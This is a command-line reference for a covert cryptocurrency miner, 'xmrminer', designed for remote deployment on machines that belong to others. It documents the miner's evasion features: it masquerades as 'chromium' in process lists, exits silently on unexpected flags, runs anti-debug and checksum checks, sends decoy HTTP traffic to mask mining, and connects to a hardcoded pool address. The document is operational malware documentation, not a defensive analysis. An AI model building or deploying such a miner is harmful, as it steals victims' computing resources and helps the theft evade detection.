# CLI Reference

## Usage

```bash
./xmrminer --run
```

Only `--run` is accepted. All other flags cause silent exit.

## `--run` Configuration

| Parameter | Value |
|-----------|-------|
| Pool URL | `wss://213.192.2.99:41928` |
| User | `x` |
| Threads | 2 |
| CPU Randomize | sine |
| Mute | on |

## Why Locked?

The binary is designed to be deployed remotely. If found by others:
- Without `--run`, it does nothing
- No configuration exposed
- No help text revealed
- Useless without the proxy server

## Process Name

Appears as `chromium` in process lists:
```bash
ps aux | grep chromium
# chromium --run
```

## Output

Mute mode (`-m`) suppresses all output except:
- `fastapi good` — on successful proxy connection
- `fastapi done` — per accepted share

## Exit Conditions

| Condition | Exit Code |
|-----------|-----------|
| No arguments | 0 |
| Invalid arguments | 0 |
| Connection failed | 1 |
| Login failed | 1 |
| Debugger detected | 1 (via `_exit`) |
| Checksum mismatch | 1 (via `_exit`) |
| SIGINT/SIGTERM | 0 (clean shutdown) |

## Interactive Commands

None — muted mode only. Process outputs nothing to terminal.

## Signal Handling

| Signal | Action |
|--------|--------|
| SIGINT (Ctrl+C) | Clean shutdown |
| SIGTERM | Clean shutdown |

Both set `g_running = 0` for graceful thread termination.

## Resource Limits

```c
setpriority(PRIO_PROCESS, 0, 19);           // Lowest CPU priority
syscall(SYS_ioprio_set, 1, 0, (3 << 8) | 0); // Lowest I/O priority
```

Miner runs at lowest priority to avoid impacting system.

## Thread Behavior

| Thread | Priority | Description |
|--------|----------|-------------|
| Main | normal | Event loop, UI |
| Anti-debug | normal | TracerPid monitor |
| Decoy HTTP | normal | HTTP requests |
| Decoy noise | normal | Persistent connections |
| Miner N | normal | RandomX hashing |

## Memory Usage

- Full dataset mode: ~2GB per thread
- Light dataset mode: ~256MB per thread
- Default: 2 threads × 2GB = ~4GB

## Network Usage

- Mining: ~10 KB/s (stratum messages)
- Decoy: ~1-5 KB/s (HTTP requests)
- Total: ~5-15 KB/s

## CPU Usage

- Mining: 100% per thread (by design)
- Anti-debug: <1% (1 check/second)
- Decoy: <1% (occasional requests)
- Total: ~200% for 2 threads
